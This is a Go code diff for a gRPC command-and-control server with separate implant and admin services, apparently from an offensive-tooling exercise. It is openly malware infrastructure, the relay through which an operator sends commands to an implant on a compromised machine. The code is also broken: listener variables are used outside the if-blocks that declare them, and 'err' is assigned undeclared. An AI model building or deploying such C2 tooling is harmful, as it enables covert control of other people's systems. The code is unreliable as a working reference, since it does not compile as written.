@@ -11,10 +11,12 @@ import (
 
 type implantServer struct {
 	work, output chan *grpcapi.Command
+	grpcapi.ImplantServer
 }
 
 type adminServer struct {
 	work, output chan *grpcapi.Command
+	grpcapi.AdminServer
 }
 
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
@@ -70,18 +72,28 @@ func main() {
 	implant := NewImplantServer(work, output)
 	admin := NewAdminServer(work, output)
 	if implantListener, err := net.Listen("tcp", "localhost:4444"); err != nil {
-		log.Fatal("Error en el listener del implant")
+		log.Print(implantListener)
+		log.Print("Error en el listener del implant")
 		log.Fatal(err)
 	}
 	if adminListener, err := net.Listen("tcp", "localhost:9090"); err != nil {
-		log.Fatal("Error en el listener del admin")
+		log.Print(adminListener)
+		log.Print("Error en el listener del admin")
 		log.Fatal(err)
 	}
 
 	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
+	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 	go func() {
-		grpcImplantServer.Serve(implantListener)
+		err = grpcImplantServer.Serve(implantListener)
+		if err != nil {
+			log.Fatal(err)
+		}
 	}()
-	grpcAdminServer.Serve(adminListener)
+	err = grpcAdminServer.Serve(adminListener)
+	if err != nil {
+		log.Fatal(err)
+	}
 
 }
